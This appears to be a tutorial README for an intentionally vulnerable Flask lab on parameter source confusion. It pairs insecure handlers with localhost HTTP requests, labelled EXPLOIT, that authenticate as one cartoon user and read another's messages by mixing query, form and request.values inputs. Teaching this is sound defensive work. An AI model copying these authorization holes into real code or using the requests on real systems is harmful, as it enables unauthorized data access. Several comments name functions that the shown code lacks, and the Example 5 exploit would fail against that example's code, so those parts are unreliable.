# Source Precedence Drift in Flask

When authentication trusts one request container and the handler trusts another, attackers can swap values between query strings, form bodies, JSON, or path params.

## Overview

Source precedence bugs creep in when two parts of the stack read the "same" input from different sources. Flask makes this easy: query strings, HTML form bodies, JSON payloads, and path parameters each land in different containers, and helpers like `request.values` silently merge them with their own priority rules.

**Common causes:**
- Security code in decorators or helpers reads from `request.args` while the view trusts `request.form` or `request.get_json()`.
- Refactors that move from query parameters to JSON do not update the guard.
- Tests rarely cover both body and query variants, so the inconsistency remains hidden until production.

**Review checklist:**
1. Identify every lookup of the relevant key (e.g. `user`, `group`, `account_id`).
2. Note whether it comes from `.args`, `.form`, `.view_args`, `.json`, or `.values`.
3. Confirm the security decision and the business logic read from the same place, or explicitly reconcile them before use.

## Table of Contents

| Category | Example | File |
|:---:|:---:|:---:|
| Secure Baselines | [Example 1: Secure Implementation](#ex-1) | [routes.py](routes.py#L38-L56) |
| Straightforward Source Drift | [Example 2: Basic Parameter Source Confusion](#ex-2) | [routes.py](routes.py#L73-L92) |
| Straightforward Source Drift | [Example 3: Function-Level Parameter Source Confusion](#ex-3) | [routes.py](routes.py#L102-L133) |
| Straightforward Source Drift | [Example 4: Cross-Module Parameter Source Confusion](#ex-4) | [routes.py](routes.py#L149-L175) |
| Helper-Induced Mixing | [Example 5: Form-Query Priority Resolution](#ex-5) | [routes.py](routes.py#L189-L215) |
| Helper-Induced Mixing | [Example 6: Mixed-Source Authentication](#ex-6) | [routes.py](routes.py#L229-L253) |
| request.values Footguns | [Example 7: Form Authentication Bypass](#ex-7) | [routes.py](routes.py#L277-L303) |
| request.values Footguns | [Example 8: Request.Values in Authentication](#ex-8) | [routes.py](routes.py#L317-L336) |

## Secure Baselines

Consistent usage keeps authentication and data access aligned - use these to understand the intended flow before exploring the vulnerable variants.

### Example 1: Secure Implementation <a id="ex-1"></a>

Here you can see a secure implementation that consistently uses query string parameters for both authentication and data retrieval.
```python
@bp.route("/example1", methods=["GET", "POST"])
def example1():
    """
    Retrieves messages for an authenticated user.

    Uses query string parameters for both authentication and message retrieval,
    ensuring consistent parameter sourcing throughout the request lifecycle.
    """
    user = request.args.get("user", None)

    password = db["passwords"].get(user, None)
    if password is None or password != request.args.get("password", None):
        return "Invalid user or password", 401

    messages = db["messages"].get(user, None)
    if messages is None:
        return "No messages found", 404

    return messages
```
<details open>
<summary><b>See HTTP Request</b></summary>

```shell
@base = http://localhost:8000/ii/source-precedence/example1

### SpongeBob can access his own messages
GET {{base}}?user=spongebob&password=bikinibottom

# Results in 200 OK:
#
# [
#   {
#     "from": "patrick",
#     "message": "SpongeBob! I'm ready! I'm ready! Let's go jellyfishing!"
#   }
# ]

###

### Squidward can access his own messages
GET {{base}}?user=squidward&password=clarinet123

# Results in 200 OK:
#
# [
#   {
#     "from": "mr.krabs",
#     "message": "Squidward, I'm switching yer shifts to Tuesday through Saturday. No complaints!"
#   },
#   {
#     "from": "squidward",
#     "message": "Note to self: Mr. Krabs hides the safe key under the register. Combination is his first dime's serial number."
#   }
# ]

###

### Plankton cannot access Squidward's messages without the correct password
GET {{base}}?user=squidward&password=wrong-password

# Results in 401 Unauthorized:
#
# Invalid user or password
```
</details>

## Straightforward Source Drift

Simple handlers where the guard inspects query parameters but the action trusts form data or vice versa.

### Example 2: Basic Parameter Source Confusion <a id="ex-2"></a>

Demonstrates the most basic form of parameter source confusion where authentication uses **query** parameters but data retrieval uses **form** data.

We take the user name from the query string during the validation, but during the data retrieval another value is used, taken from the request body (form). This does not look very realistic, but it demonstrates the core of the vulnerability, we will build upon this further.

Here you can see if we provide squidward's name in the request body, we can access his messages without his password.
```python
@bp.route("/example2", methods=["GET", "POST"])
def example2():
    """
    Retrieves messages for an authenticated user.

    Supports flexible parameter passing to accommodate various client implementations.
    """
    user = request.args.get("user", None)

    password = db["passwords"].get(user, None)
    if password is None or password != request.args.get("password", None):
        return "Invalid user or password", 401

    # Allow form data to specify the target user for message retrieval
    user = request.form.get("user", None)
    messages = db["messages"].get(user, None)
    if messages is None:
        return "No messages found", 404

    return messages
```
<details>
<summary><b>See HTTP Request</b></summary>

```shell
@base = http://localhost:8000/ii/source-precedence/example2

### SpongeBob can authenticate and retrieve his own messages using consistent parameters
GET {{base}}?user=spongebob&password=bikinibottom
Content-Type: application/x-www-form-urlencoded

user=spongebob

# Results in 200 OK:
#
# [
#   {
#     "from": "patrick",
#     "message": "SpongeBob! I'm ready! I'm ready! Let's go jellyfishing!"
#   }
# ]

###

### EXPLOIT: Plankton authenticates as SpongeBob but retrieves Squidward's messages
### by providing different usernames in query string (for auth) vs form body (for retrieval)
GET {{base}}?user=spongebob&password=bikinibottom
Content-Type: application/x-www-form-urlencoded

user=squidward

# Results in data disclosure:
#
# [
#   {
#     "from": "mr.krabs",
#     "message": "Squidward, I'm switching yer shifts to Tuesday through Saturday. No complaints!"
#   },
#   {
#     "from": "squidward",
#     "message": "Note to self: Mr. Krabs hides the safe key under the register. Combination is his first dime's serial number."
#   }
# ]
#
# IMPACT: Plankton has stolen Squidward's private notes, learning where Mr. Krabs
# hides the safe key! This basic parameter source confusion allows reading any user's
# messages by authenticating as one user while requesting another's data.
```

</details>

### Example 3: Function-Level Parameter Source Confusion <a id="ex-3"></a>

Functionally equivalent to example 2, but shows how separating authentication and data retrieval into different functions can make the vulnerability harder to spot.
```python
def authenticate(user, password):
    """Validates user credentials against the database."""
    if password is None or password != db["passwords"].get(user, None):
        return False
    return True


def get_messages(user):
    """Retrieves all messages for the specified user."""
    messages = db["messages"].get(user, None)
    if messages is None:
        return None
    return {"owner": user, "messages": messages}


@bp.route("/example3", methods=["GET", "POST"])
def example3():
    """
    Retrieves messages for an authenticated user.

    Uses modular authentication and data retrieval functions for cleaner separation of concerns.
    """
    if not authenticate(
        request.args.get("user", None), request.args.get("password", None)
    ):
        return "Invalid user or password", 401

    messages = get_messages(request.form.get("user", None))
    if messages is None:
        return "No messages found", 404

    return messages
```
<details open>
<summary><b>See HTTP Request</b></summary>

```shell
@base = http://localhost:8000/ii/source-precedence/example3

### SpongeBob authenticates and retrieves his own messages
GET {{base}}?user=spongebob&password=bikinibottom
Content-Type: application/x-www-form-urlencoded

user=spongebob

# Results in 200 OK:
#
# {
#   "owner": "spongebob",
#   "messages": [
#     {
#       "from": "patrick",
#       "message": "SpongeBob! I'm ready! I'm ready! Let's go jellyfishing!"
#     }
#   ]
# }

###

### EXPLOIT: Plankton authenticates as SpongeBob but accesses Squidward's messages
### The modular authentication function reads from query, but message retrieval uses form data
GET {{base}}?user=spongebob&password=bikinibottom
Content-Type: application/x-www-form-urlencoded

user=squidward

# Results in data disclosure:
#
# {
#   "owner": "squidward",
#   "messages": [
#     {
#       "from": "mr.krabs",
#       "message": "Squidward, I'm switching yer shifts to Tuesday through Saturday. No complaints!"
#     },
#     {
#       "from": "squidward",
#       "message": "Note to self: Mr. Krabs hides the safe key under the register. Combination is his first dime's serial number."
#     }
#   ]
# }
#
# IMPACT: Despite authentication being separated into its own function (which makes
# the code look more professional), Plankton still steals Squidward's secrets!
# The vulnerability persists because the authenticate_user() function reads from
# query parameters while the handler reads from form data.
```
</details>

### Example 4: Cross-Module Parameter Source Confusion <a id="ex-4"></a>

In the previous example, you can still see that the `user` value gets retrieved from the `request.args` during validation but from the `request.form` during data retrieval.

A more subtle example, where this is not immediately obvious (imagine, `authenticate_user` is defined in an another file altogether):
```python
def authenticate_user():
    """
    Authenticates the current user using query string credentials.

    Designed for GET-based authentication flows where credentials are passed in the URL.
    """
    return authenticate(
        request.args.get("user", None), request.args.get("password", None)
    )


@bp.route("/example4", methods=["GET", "POST"])
def example4():
    """
    Retrieves messages for an authenticated user.

    Delegates authentication to a shared utility function while handling
    message retrieval directly in the endpoint.
    """
    if not authenticate_user():
        return "Invalid user or password", 401

    messages = get_messages(request.form.get("user", None))
    if messages is None:
        return "No messages found", 404

    return messages
```
<details>
<summary><b>See HTTP Request</b></summary>

```shell
@base = http://localhost:8000/ii/source-precedence/example4

### SpongeBob authenticates and retrieves his own messages using query parameters
GET {{base}}?user=spongebob&password=bikinibottom

# Results in 200 OK:
#
# {
#   "owner": "spongebob",
#   "messages": [
#     {
#       "from": "patrick",
#       "message": "SpongeBob! I'm ready! I'm ready! Let's go jellyfishing!"
#     }
#   ]
# }

###

### EXPLOIT: Plankton discovers that even without form data, he can still attack
### by providing Squidward's username in the request body (the get_user() helper prioritizes form over query)
GET {{base}}?user=spongebob&password=bikinibottom
Content-Type: application/x-www-form-urlencoded

user=squidward

# Results in data disclosure:
#
# {
#   "owner": "squidward",
#   "messages": [
#     {
#       "from": "mr.krabs",
#       "message": "Squidward, I'm switching yer shifts to Tuesday through Saturday. No complaints!"
#     },
#     {
#       "from": "squidward",
#       "message": "Note to self: Mr. Krabs hides the safe key under the register. Combination is his first dime's serial number."
#     }
#   ]
# }
#
# IMPACT: The get_user() helper function looks innocuous - it just provides flexibility
# for clients! But its form-first priority rule creates an exploitable source confusion.
# Plankton steals Squidward's secrets again by exploiting the helper's precedence logic.
```

</details>

## Helper-Induced Mixing

Utility functions that merge sources (or hide precedence rules) create subtle inconsistencies developers rarely spot in review.

### Example 5: Form-Query Priority Resolution <a id="ex-5"></a>

Shows how a helper function that implements source prioritization can create vulnerabilities.

In Example 5 we don't need to specify body parameters to get a result (which is now more realistic!), but if we want, we can still access squidward's messages by passing his user name in the request body:
```python
def get_user():
    """
    Retrieves the user identifier from the request.

    Checks form data first for POST requests, falling back to query parameters
    to support both form submissions and direct URL access.
    """
    user_from_form = request.form.get("user", None)
    user_from_args = request.args.get("user", None)

    return user_from_form or user_from_args


@bp.route("/example5", methods=["GET", "POST"])
def example5():
    """
    Retrieves messages for an authenticated user.

    Uses a flexible user resolution strategy that accommodates multiple parameter sources.
    """
    if not authenticate_user():
        return "Invalid user or password", 401

    messages = get_messages(get_user())
    if messages is None:
        return "No messages found", 404
    return messages
```
<details>
<summary><b>See HTTP Request</b></summary>

```shell
@base = http://localhost:8000/ii/source-precedence/example5

### SpongeBob authenticates and retrieves his messages normally
GET {{base}}?user=spongebob&password=bikinibottom

# Results in 200 OK:
#
# {
#   "owner": "spongebob",
#   "messages": [
#     {
#       "from": "patrick",
#       "message": "SpongeBob! I'm ready! I'm ready! Let's go jellyfishing!"
#     }
#   ]
# }

###

### EXPLOIT: Plankton exploits the authentication's use of get_user() while data retrieval uses query
### Provides SpongeBob in the form body (used by auth) and Squidward in query (used by retrieval)
GET {{base}}?user=squidward&password=bikinibottom
Content-Type: application/x-www-form-urlencoded

user=spongebob

# Results in data disclosure:
#
# {
#   "owner": "squidward",
#   "messages": [
#     {
#       "from": "mr.krabs",
#       "message": "Squidward, I'm switching yer shifts to Tuesday through Saturday. No complaints!"
#     },
#     {
#       "from": "squidward",
#       "message": "Note to self: Mr. Krabs hides the safe key under the register. Combination is his first dime's serial number."
#     }
#   ]
# }
#
# IMPACT: This variant reverses the attack! Now Plankton authenticates with SpongeBob's
# credentials (username from form, password from query) while retrieving Squidward's messages
# (username from query). The mixed-source authentication creates a cross-over vulnerability.
```

</details>

### Example 6: Mixed-Source Authentication <a id="ex-6"></a>

Shows how authentication and data access can use different combinations of sources.

This one is interesting, because you can access Squidward's messages by providing his username and SpongeBob's password in the request query, while providing SpongeBob's username in the request body:
```python
def authenticate_user_example6():
    """
    Authenticates the current user with flexible parameter resolution.

    Uses the user resolution helper for username while taking password from query string.
    """
    user = get_user()
    password = request.args.get("password", None)
    return authenticate(user, password)


@bp.route("/example6", methods=["GET", "POST"])
def example6():
    """
    Retrieves messages for an authenticated user.

    Combines flexible authentication with query-based message retrieval.
    """
    if not authenticate_user_example6():
        return "Invalid user or password", 401

    messages = get_messages(request.args.get("user", None))
    if messages is None:
        return "No messages found", 404
    return messages
```
<details>
<summary><b>See HTTP Request</b></summary>

```shell
@base = http://localhost:8000/ii/source-precedence/example6

### SpongeBob authenticates with form data and retrieves his messages
GET {{base}}?user=spongebob&password=bikinibottom
Content-Type: application/x-www-form-urlencoded

user=spongebob

# Results in 200 OK:
#
# {
#   "owner": "spongebob",
#   "messages": [
#     {
#       "from": "patrick",
#       "message": "SpongeBob! I'm ready! I'm ready! Let's go jellyfishing!"
#     }
#   ]
# }

###

### EXPLOIT: Plankton exploits mixed-source authentication with reversed parameters
### Authentication uses get_user() (form-first) while data retrieval uses query parameters
GET {{base}}?user=squidward&password=bikinibottom
Content-Type: application/x-www-form-urlencoded

user=spongebob

# Results in data disclosure:
#
# {
#   "owner": "squidward",
#   "messages": [
#     {
#       "from": "mr.krabs",
#       "message": "Squidward, I'm switching yer shifts to Tuesday through Saturday. No complaints!"
#     },
#     {
#       "from": "squidward",
#       "message": "Note to self: Mr. Krabs hides the safe key under the register. Combination is his first dime's serial number."
#     }
#   ]
# }
#
# IMPACT: Plankton authenticates as SpongeBob (username from form via get_user(), password from query)
# but retrieves Squidward's data (username from query)! This demonstrates how authentication
# that uses a flexible helper while data access uses a fixed source creates exploitable drift.
```

</details>

## request.values Footguns

`request.values` promises convenience but applies its own precedence rules, leading to silent bypasses when paired with explicit `.args` or `.form` lookups.

### Example 7: Form Authentication Bypass <a id="ex-7"></a>

The endpoint uses form data for authentication, but request.values.get() allows query parameters to override form values, creating a vulnerability. Although designed for POST requests, the endpoint accepts both GET and POST methods, enabling the attack.

Note that although the regular usage would rely on POST request (or PUT, PATCH, etc.), and wouldn't work with GET (because flask's request.values ignores form data in GET requests), the attacker can send both GET and POST requests (if the endpoint is configured to accept both methods).

```http
POST /ii/source-precedence/example7? HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

user=spongebob&password=bikinibottom
```

However, the attacker can send both GET and POST requests (if the endpoint is configured to accept both methods).
```python
def authenticate_user_example7():
    """
    Authenticates the user using form-based credentials.

    Designed for POST-based form submissions where credentials are in the request body.
    """
    return authenticate(
        request.form.get("user", None), request.form.get("password", None)
    )


@bp.route("/example7", methods=["GET", "POST"])
def example7():
    """
    Retrieves messages for an authenticated user.

    Uses form-based authentication with unified parameter resolution for message retrieval.
    """
    if not authenticate_user_example7():
        return "Invalid user or password", 401

    # Use request.values for flexible parameter resolution across query and form data
    messages = get_messages(request.values.get("user", None))
    if messages is None:
        return "No messages found", 404

    return messages
```
<details>
<summary><b>See HTTP Request</b></summary>

```shell
@base = http://localhost:8000/ii/source-precedence/example7

### SpongeBob authenticates via form body and retrieves his messages
POST {{base}}
Content-Type: application/x-www-form-urlencoded

user=spongebob&password=bikinibottom

# Results in 200 OK:
#
# {
#   "owner": "spongebob",
#   "messages": [
#     {
#       "from": "patrick",
#       "message": "SpongeBob! I'm ready! I'm ready! Let's go jellyfishing!"
#     }
#   ]
# }

###

### EXPLOIT: Plankton discovers request.values merges query and form data
### Authentication uses form-only, but data retrieval uses request.values (query takes precedence!)
POST {{base}}?user=squidward
Content-Type: application/x-www-form-urlencoded

user=spongebob&password=bikinibottom

# Results in data disclosure:
#
# {
#   "owner": "squidward",
#   "messages": [
#     {
#       "from": "mr.krabs",
#       "message": "Squidward, I'm switching yer shifts to Tuesday through Saturday. No complaints!"
#     },
#     {
#       "from": "squidward",
#       "message": "Note to self: Mr. Krabs hides the safe key under the register. Combination is his first dime's serial number."
#     }
#   ]
# }

###

### The attack also works with GET (if endpoint accepts both methods):
GET {{base}}?user=squidward
Content-Type: application/x-www-form-urlencoded

user=spongebob&password=bikinibottom

# Results in data disclosure (same as above)
#
# IMPACT: Flask's request.values.get() merges form and query parameters with query
# taking precedence! Plankton authenticates as SpongeBob using form credentials,
# but request.values reads "squidward" from the query string for data retrieval.
# This is particularly dangerous because request.values looks like a convenience
# feature but silently introduces exploitable precedence rules.
```

</details>

### Example 8: Request.Values in Authentication <a id="ex-8"></a>

Demonstrates how using request.values in authentication while using form data for access creates vulnerabilities.

This is an example of a varient of example 7, as we do the similar thing, but now we can pass Squidward's username in the request body with SpongeBob's password, while passing SpongeBob's username in the request query. Note that this example does not work with GET request, use POST.
```python
@bp.route("/example8", methods=["GET", "POST"])
def example8():
    """
    Retrieves messages for an authenticated user.

    Uses unified parameter resolution for authentication to support flexible client implementations,
    while retrieving messages based on form data.
    """
    # Authenticate using merged values from both query and form data
    if not authenticate(
        request.values.get("user", None), request.values.get("password", None)
    ):
        return "Invalid user or password", 401

    # Retrieve messages using form data
    messages = get_messages(request.form.get("user", None))
    if messages is None:
        return "No messages found", 404

    return messages
```
<details>
<summary><b>See HTTP Request</b></summary>

```shell
@base = http://localhost:8000/ii/source-precedence/example8

### SpongeBob authenticates and retrieves his messages using POST body
POST {{base}}
Content-Type: application/x-www-form-urlencoded

user=spongebob&password=bikinibottom

# Results in 200 OK:
#
# {
#   "owner": "spongebob",
#   "messages": [
#     {
#       "from": "patrick",
#       "message": "SpongeBob! I'm ready! I'm ready! Let's go jellyfishing!"
#     }
#   ]
# }

###

### EXPLOIT: Plankton exploits request.values in authentication with form-only retrieval
### Provides SpongeBob username in query (used by request.values auth) and Squidward in form (used by retrieval)
POST {{base}}?user=spongebob
Content-Type: application/x-www-form-urlencoded

user=squidward&password=bikinibottom

# Results in data disclosure:
#
# {
#   "owner": "squidward",
#   "messages": [
#     {
#       "from": "mr.krabs",
#       "message": "Squidward, I'm switching yer shifts to Tuesday through Saturday. No complaints!"
#     },
#     {
#       "from": "squidward",
#       "message": "Note to self: Mr. Krabs hides the safe key under the register. Combination is his first dime's serial number."
#     }
#   ]
# }
#
# IMPACT: This reverses the previous attack! Now request.values in authentication
# reads "spongebob" from query (with password from query via request.values),
# while message retrieval reads "squidward" from form data only. Plankton steals
# Squidward's secrets by exploiting the asymmetry between request.values authentication
# and form-only data access. This demonstrates that request.values is dangerous in
# EITHER position - whether in authentication or data access.
```

</details>

